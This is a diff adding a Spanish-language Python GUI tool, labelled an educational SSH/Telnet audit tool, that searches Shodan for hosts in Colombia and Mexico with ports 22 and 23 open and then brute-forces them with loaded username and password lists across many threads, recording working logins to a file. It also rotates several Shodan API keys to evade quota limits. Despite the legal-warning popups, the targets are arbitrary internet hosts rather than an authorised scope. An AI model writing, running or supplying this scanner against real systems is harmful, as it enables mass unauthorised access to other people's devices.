@@ -1,0 +1,513 @@
+"""
+HERRAMIENTA DE AUDITORÍA SSH/TELNET
+===================================
+
+Este script permite realizar auditorías de seguridad en servicios SSH y Telnet,
+incluyendo búsqueda de dispositivos mediante Shodan API y pruebas de credenciales.
+
+Características principales:
+- Interfaz gráfica con Tkinter
+- Búsqueda de dispositivos con Shodan API
+- Pruebas de autenticación con multi-hilos
+- Manejo robusto de errores
+- Configuración mediante variables de entorno
+- Logging detallado
+
+"""
+
+# =============================================================================
+# MÓDULOS REQUERIDOS
+# =============================================================================
+import tkinter as tk
+from tkinter import filedialog, messagebox
+import shodan
+import paramiko
+from Exscript.protocols import Telnet
+import threading
+import re
+import os
+import logging
+import socket
+from datetime import datetime
+from tqdm import tqdm
+from dotenv import load_dotenv
+
+# =============================================================================
+# CONFIGURACIÓN INICIAL
+# =============================================================================
+load_dotenv()  # Carga variables de entorno desde archivo .env
+
+# Configuración del sistema de logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('auditoria.log'),  # Log a archivo
+        logging.StreamHandler()  # Log a consola
+    ]
+)
+
+# =============================================================================
+# CLASES DE ERRORES PERSONALIZADOS
+# =============================================================================
+class AuditoriaError(Exception):
+    """Clase base para errores personalizados de la aplicación"""
+    pass
+
+class ShodanError(AuditoriaError):
+    """Error específico para problemas con la API de Shodan"""
+    pass
+
+class ConexionError(AuditoriaError):
+    """Error para problemas de conexión con dispositivos remotos"""
+    pass
+
+class AutenticacionError(AuditoriaError):
+    """Error para fallos de autenticación"""
+    pass
+
+class LimiteAPIError(AuditoriaError):
+    """Error cuando se excede el límite de la API"""
+    pass
+
+# =============================================================================
+# CONFIGURACIÓN DE LA APLICACIÓN
+# =============================================================================
+class Config:
+    """
+    Clase de configuración de la aplicación.
+    
+    Atributos:
+        SHODAN_KEYS (list): Lista de API keys para Shodan
+        MAX_THREADS (int): Número máximo de hilos concurrentes
+        SSH_TIMEOUT (int): Timeout para conexiones SSH (segundos)
+        TELNET_TIMEOUT (int): Timeout para conexiones Telnet (segundos)
+        ALLOWED_COUNTRIES (list): Países permitidos para búsquedas
+    """
+    
+    SHODAN_KEYS = [os.getenv('SHODAN_API_KEY')]  # Carga la key desde .env
+    MAX_THREADS = 15  # Límite de hilos concurrentes
+    SSH_TIMEOUT = 10  # Timeout para SSH en segundos
+    TELNET_TIMEOUT = 10  # Timeout para Telnet en segundos
+    ALLOWED_COUNTRIES = ["CO", "MX"]  # Códigos de países permitidos
+
+    @classmethod
+    def validate(cls):
+        """Valida que la configuración sea correcta"""
+        if not any(cls.SHODAN_KEYS):
+            raise ValueError("API key de Shodan debe estar configurada")
+
+# Validar configuración al iniciar
+try:
+    Config.validate()
+except ValueError as e:
+    logging.critical(str(e))
+    messagebox.showerror("Error de Configuración", str(e))
+    exit(1)
+
+# =============================================================================
+# MANEJO DE LA API DE SHODAN
+# =============================================================================
+class ShodanManager:
+    """
+    Clase para manejar las operaciones con la API de Shodan.
+    
+    Permite rotación automática de múltiples API keys y reintentos de conexión.
+    """
+    
+    def __init__(self, api_keys):
+        """
+        Inicializa el manager con las API keys proporcionadas.
+        
+        Args:
+            api_keys (list): Lista de API keys para Shodan
+        """
+        self.api_keys = api_keys
+        self.current_key_index = 0
+        self.api = shodan.Shodan(self.api_keys[0])
+        
+    def rotate_key(self):
+        """
+        Rota a la siguiente API key disponible.
+        
+        Raises:
+            LimiteAPIError: Si no hay más keys disponibles
+        """
+        if len(self.api_keys) <= 1:
+            raise LimiteAPIError("No hay más API keys disponibles")
+        self.current_key_index = (self.current_key_index + 1) % len(self.api_keys)
+        self.api = shodan.Shodan(self.api_keys[self.current_key_index])
+        logging.info(f"Rotando a API key #{self.current_key_index + 1}")
+        
+    def search_with_retry(self, query, max_retries=3, **kwargs):
+        """
+        Realiza búsquedas con reintentos automáticos ante fallos.
+        
+        Args:
+            query (str): Consulta de búsqueda para Shodan
+            max_retries (int): Intentos máximos antes de fallar
+            **kwargs: Parámetros adicionales para la API
+            
+        Returns:
+            dict: Resultados de la búsqueda
+            
+        Raises:
+            LimiteAPIError: Si se agotan los intentos o créditos
+            ShodanError: Para otros errores de la API
+        """
+        for attempt in range(max_retries):
+            try:
+                return self.api.search(query, **kwargs)
+            except shodan.APIError as e:
+                if "plan upgrade" in str(e).lower() or "invalid key" in str(e).lower():
+                    if attempt < max_retries - 1:
+                        self.rotate_key()
+                        continue
+                raise
+        raise LimiteAPIError("Todas las API keys fallaron o se agotaron los créditos")
+
+# =============================================================================
+# VARIABLES GLOBALES Y UTILIDADES
+# =============================================================================
+# Variables globales protegidas por locks para acceso thread-safe
+ips_cargadas = []  # Lista de IPs a auditar
+usuarios_cargados = []  # Lista de usuarios para pruebas
+passwords_cargados = []  # Lista de contraseñas para pruebas
+lock = threading.Lock()  # Lock para acceso a variables compartidas
+thread_limiter = threading.BoundedSemaphore(Config.MAX_THREADS)  # Limitador de hilos
+shodan_manager = ShodanManager(Config.SHODAN_KEYS)  # Manager de Shodan
+
+def es_ip_valida(ip):
+    """
+    Valida si una cadena es una dirección IP válida.
+    
+    Args:
+        ip (str): Dirección IP a validar
+        
+    Returns:
+        bool: True si es válida, False si no
+    """
+    patron = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
+    return re.match(patron, ip) is not None
+
+def mostrar_advertencia_legal():
+    """Muestra una advertencia legal sobre el uso de la herramienta."""
+    legal = """
+    ADVERTENCIA LEGAL:
+    Este software es solo para fines educativos y de investigación autorizada.
+    Es ilegal usarlo contra sistemas sin permiso explícito por escrito.
+    """
+    messagebox.showwarning("Advertencia Legal", legal)
+
+# =============================================================================
+# FUNCIONES PRINCIPALES
+# =============================================================================
+def buscar_ips():
+    """
+    Busca dispositivos con puertos SSH/Telnet abiertos usando Shodan API.
+    
+    Los resultados se guardan en 'ips_encontradas.txt'.
+    """
+    try:
+        mostrar_advertencia_legal()
+        
+        # Verificar créditos disponibles en Shodan
+        creditos = shodan_manager.api.info()['query_credits']
+        if creditos < 10:
+            raise LimiteAPIError(f"Créditos insuficientes en Shodan: {creditos}")
+        
+        # Construir y ejecutar consulta
+        query = f'port:22,23 country:{",".join(Config.ALLOWED_COUNTRIES)}'
+        resultados = shodan_manager.search_with_retry(query, limit=100)
+        
+        if not resultados['matches']:
+            logging.warning("Búsqueda devolvió 0 resultados")
+            messagebox.showinfo("Información", "No se encontraron dispositivos con los criterios especificados")
+            return
+
+        # Guardar resultados en archivo
+        with open("ips_encontradas.txt", "w") as file:
+            for resultado in resultados['matches']:
+                try:
+                    ip = resultado['ip_str']
+                    if not es_ip_valida(ip):
+                        continue
+                    file.write(f"{ip}|{resultado.get('port', '?')}|{resultado.get('org', '?')}\n")
+                except KeyError as e:
+                    logging.error(f"Error procesando resultado: {e}")
+                    continue
+
+        messagebox.showinfo("Búsqueda Completada", 
+                          f"Se encontraron {len(resultados['matches'])} dispositivos (guardados en ips_encontradas.txt)")
+        logging.info(f"Búsqueda completada. {len(resultados['matches'])} dispositivos encontrados")
+
+    except LimiteAPIError as e:
+        logging.critical(str(e))
+        messagebox.showerror("Error Crítico", str(e))
+    except ShodanError as e:
+        logging.error(str(e))
+        messagebox.showerror("Error de Shodan", str(e))
+    except Exception as e:
+        logging.error(f"Error inesperado en buscar_ips: {str(e)}", exc_info=True)
+        messagebox.showerror("Error", f"Error inesperado: {str(e)}")
+
+def cargar_archivo(tipo):
+    """
+    Carga archivos de configuración (IPs, usuarios o contraseñas).
+    
+    Args:
+        tipo (str): Tipo de archivo a cargar ("IPs", "usuarios" o "contraseñas")
+    """
+    global ips_cargadas, usuarios_cargados, passwords_cargados
+    
+    archivo = filedialog.askopenfilename(
+        title=f"Selecciona archivo de {tipo}", 
+        filetypes=[("Archivos de texto", "*.txt")]
+    )
+    if not archivo:
+        return
+
+    try:
+        with open(archivo, "r") as file:
+            lineas = [line.strip() for line in file if line.strip()]
+            
+            with lock:  # Bloqueo para acceso thread-safe
+                if tipo == "IPs":
+                    ips_cargadas = [ip.split('|')[0] for ip in lineas if es_ip_valida(ip.split('|')[0])]
+                    messagebox.showinfo("Cargado", f"{len(ips_cargadas)} IPs válidas cargadas")
+                elif tipo == "usuarios":
+                    usuarios_cargados = lineas
+                    messagebox.showinfo("Cargado", f"{len(usuarios_cargados)} usuarios cargados")
+                elif tipo == "contraseñas":
+                    passwords_cargados = lineas
+                    messagebox.showinfo("Cargado", f"{len(passwords_cargados)} contraseñas cargadas")
+                    
+    except Exception as e:
+        logging.error(f"Error al cargar archivo {tipo}: {str(e)}", exc_info=True)
+        messagebox.showerror("Error", f"No se pudo cargar el archivo: {str(e)}")
+
+def validar_ssh(ip, usuario, password, pbar):
+    """
+    Intenta autenticarse en un servicio SSH con las credenciales proporcionadas.
+    
+    Args:
+        ip (str): Dirección IP del servidor
+        usuario (str): Nombre de usuario
+        password (str): Contraseña
+        pbar (tqdm): Barra de progreso para actualizar
+    """
+    try:
+        with thread_limiter:  # Limitar hilos concurrentes
+            cliente = paramiko.SSHClient()
+            cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            try:
+                # Intentar conexión SSH
+                cliente.connect(
+                    ip, 
+                    port=22, 
+                    username=usuario, 
+                    password=password, 
+                    timeout=Config.SSH_TIMEOUT,
+                    banner_timeout=Config.SSH_TIMEOUT,
+                    auth_timeout=Config.SSH_TIMEOUT
+                )
+                
+                # Verificación adicional ejecutando un comando simple
+                _, stdout, _ = cliente.exec_command('echo "Prueba"', timeout=5)
+                if stdout.channel.recv_exit_status() != 0:
+                    raise AutenticacionError("Comando de prueba falló")
+                
+                # Guardar credenciales válidas
+                with lock:
+                    with open("credenciales_validas.txt", "a") as file:
+                        file.write(f"[SSH-VALIDO] {datetime.now()} | {ip} | {usuario}:{password}\n")
+                logging.info(f"Conexión SSH exitosa: {ip} | {usuario}")
+                
+            except paramiko.AuthenticationException:
+                # Registrar intento fallido
+                with lock:
+                    with open("intentos_fallidos.log", "a") as file:
+                        file.write(f"[SSH-FALLIDO] {datetime.now()} | {ip} | {usuario}:{password}\n")
+                raise AutenticacionError(f"Autenticación fallida en {ip}") from None
+                
+            except paramiko.SSHException as e:
+                raise ConexionError(f"Error SSH en {ip}: {str(e)}") from e
+                
+            except socket.timeout:
+                raise ConexionError(f"Timeout conectando a {ip}") from None
+                
+            finally:
+                cliente.close()
+                
+    except (AutenticacionError, ConexionError) as e:
+        logging.debug(str(e))  # Debug para errores esperados
+    except Exception as e:
+        logging.error(f"Error inesperado en validar_ssh ({ip}): {str(e)}", exc_info=True)
+    finally:
+        pbar.update(1)  # Actualizar barra de progreso
+
+def validar_telnet(ip, usuario, password, pbar):
+    """
+    Intenta autenticarse en un servicio Telnet con las credenciales proporcionadas.
+    
+    Args:
+        ip (str): Dirección IP del servidor
+        usuario (str): Nombre de usuario
+        password (str): Contraseña
+        pbar (tqdm): Barra de progreso para actualizar
+    """
+    try:
+        with thread_limiter:  # Limitar hilos concurrentes
+            conn = Telnet()
+            try:
+                conn.connect(ip, timeout=Config.TELNET_TIMEOUT)
+                conn.execute('')  # Comando vacío para verificar sesión
+                
+                # Guardar credenciales válidas
+                with lock:
+                    with open("credenciales_validas.txt", "a") as file:
+                        file.write(f"[TELNET-VALIDO] {datetime.now()} | {ip} | {usuario}:{password}\n")
+                logging.info(f"Conexión Telnet exitosa: {ip} | {usuario}")
+                
+            except Exception as e:
+                if "Login failed" in str(e):
+                    # Registrar intento fallido
+                    with lock:
+                        with open("intentos_fallidos.log", "a") as file:
+                            file.write(f"[TELNET-FALLIDO] {datetime.now()} | {ip} | {usuario}:{password}\n")
+                    raise AutenticacionError(f"Autenticación Telnet fallida en {ip}") from None
+                raise ConexionError(f"Error Telnet en {ip}: {str(e)}") from e
+                
+    except (AutenticacionError, ConexionError) as e:
+        logging.debug(str(e))  # Debug para errores esperados
+    except Exception as e:
+        logging.error(f"Error inesperado en validar_telnet ({ip}): {str(e)}", exc_info=True)
+    finally:
+        try:
+            conn.close()
+        except:
+            pass
+        pbar.update(1)  # Actualizar barra de progreso
+
+def iniciar_validacion():
+    """
+    Inicia el proceso de validación de credenciales contra todas las IPs cargadas.
+    """
+    try:
+        # Validar que se hayan cargado todos los datos necesarios
+        if not all([ips_cargadas, usuarios_cargados, passwords_cargados]):
+            raise AuditoriaError("Faltan datos: IPs, usuarios o contraseñas")
+        
+        mostrar_advertencia_legal()
+        
+        # Calcular total de intentos (SSH + Telnet para cada combinación)
+        total = len(ips_cargadas) * len(usuarios_cargados) * len(passwords_cargados) * 2
+        
+        # Configurar archivos de resultados
+        with open("credenciales_validas.txt", "a") as f:
+            f.write(f"\n=== NUEVA EJECUCIÓN {datetime.now()} ===\n")
+        
+        with open("intentos_fallidos.log", "a") as f:
+            f.write(f"\n=== NUEVA EJECUCIÓN {datetime.now()} ===\n")
+        
+        # Configurar barra de progreso
+        with tqdm(total=total, desc="Probando credenciales") as pbar:
+            threads = []
+            for ip in ips_cargadas:
+                for usuario in usuarios_cargados:
+                    for password in passwords_cargados:
+                        try:
+                            # Crear hilos para SSH y Telnet
+                            t1 = threading.Thread(
+                                target=validar_ssh,
+                                args=(ip, usuario, password, pbar),
+                                daemon=True
+                            )
+                            t2 = threading.Thread(
+                                target=validar_telnet,
+                                args=(ip, usuario, password, pbar),
+                                daemon=True
+                            )
+                            t1.start()
+                            t2.start()
+                            threads.append(t1)
+                            threads.append(t2)
+                        except Exception as e:
+                            logging.error(f"Error al iniciar hilo: {str(e)}")
+                            continue
+            
+            # Esperar a que terminen los hilos con timeout
+            for t in threads:
+                try:
+                    t.join(timeout=30)
+                except Exception as e:
+                    logging.warning(f"Hilo no terminó correctamente: {str(e)}")
+        
+        messagebox.showinfo("Completado", "Prueba de credenciales finalizada")
+        
+    except LimiteAPIError as e:
+        logging.critical(str(e))
+        messagebox.showerror("Error Crítico", f"{str(e)}\nContacta al administrador")
+    except AuditoriaError as e:
+        logging.warning(str(e))
+        messagebox.showwarning("Advertencia", str(e))
+    except Exception as e:
+        logging.critical(f"Error inesperado: {str(e)}", exc_info=True)
+        messagebox.showerror("Error Grave", f"Error inesperado:\n{str(e)}")
+
+# =============================================================================
+# INTERFAZ GRÁFICA
+# =============================================================================
+class Aplicacion(tk.Tk):
+    """
+    Clase principal para la interfaz gráfica de la aplicación.
+    """
+    
+    def __init__(self):
+        """Inicializa la aplicación y configura la interfaz."""
+        super().__init__()
+        self.title("Herramienta Educativa de Auditoría")
+        self.geometry("500x500")
+        self.configure(bg="#f0f0f0")
+        
+        self.crear_interfaz()
+        mostrar_advertencia_legal()
+    
+    def crear_interfaz(self):
+        """Crea y organiza los elementos de la interfaz gráfica."""
+        frame = tk.Frame(self, bg="#f0f0f0")
+        frame.pack(pady=20)
+        
+        # Título
+        tk.Label(frame, text="HERRAMIENTA EDUCATIVA", 
+                font=("Arial", 14, "bold"), bg="#f0f0f0").grid(row=0, columnspan=2, pady=10)
+        
+        # Botones de búsqueda y carga
+        tk.Button(frame, text="Buscar IPs (Shodan)", command=buscar_ips, width=25).grid(row=1, column=0, pady=5, padx=5)
+        tk.Button(frame, text="Cargar IPs", command=lambda: cargar_archivo("IPs"), width=25).grid(row=1, column=1, pady=5, padx=5)
+        
+        tk.Button(frame, text="Cargar Usuarios", command=lambda: cargar_archivo("usuarios"), width=25).grid(row=2, column=0, pady=5, padx=5)
+        tk.Button(frame, text="Cargar Contraseñas", command=lambda: cargar_archivo("contraseñas"), width=25).grid(row=2, column=1, pady=5, padx=5)
+        
+        # Botón principal
+        tk.Button(frame, text="Iniciar Validación", command=iniciar_validacion, 
+                 bg="#4CAF50", fg="white", width=52).grid(row=3, columnspan=2, pady=20)
+        
+        # Advertencia legal
+        tk.Label(frame, text="ADVERTENCIA: Solo uso educativo en sistemas autorizados", 
+                fg="red", bg="#f0f0f0").grid(row=4, columnspan=2, pady=10)
+
+# =============================================================================
+# EJECUCIÓN PRINCIPAL
+# =============================================================================
+if __name__ == "__main__":
+    """
+    Punto de entrada principal de la aplicación.
+    """
+    try:
+        app = Aplicacion()
+        app.mainloop()
+    except Exception as e:
+        logging.critical(f"Error en la aplicación: {str(e)}", exc_info=True)
+        messagebox.showerror("Error Fatal", f"La aplicación encontró un error y debe cerrarse:\n{str(e)}")
